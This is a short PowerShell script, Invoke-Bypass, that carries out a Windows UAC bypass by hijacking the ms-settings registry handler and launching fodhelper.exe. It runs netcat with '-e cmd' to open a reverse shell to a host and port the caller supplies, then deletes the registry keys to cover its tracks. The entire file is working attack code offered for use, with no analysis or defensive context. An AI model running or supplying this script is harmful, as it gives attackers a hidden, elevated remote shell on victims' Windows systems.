function Invoke-Bypass {
    [cmdletbinding()]
    param(
        [Parameter(Position = 0, Mandatory = $true)]
        [string]$LHOST,

        [Parameter(Position = 1, Mandatory = $true)]
        [string]$LPORT,

        [Parameter(ParameterSetName="help")]
        [Switch]$help
    )

    # Default program to run on successful UAC bypass
    $program = "cmd /c C:\Temp\nc64.exe $LHOST $LPORT -e cmd"
    
    # Create registry structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

    # Perform the bypass
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    # Remove registry structure after bypass
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
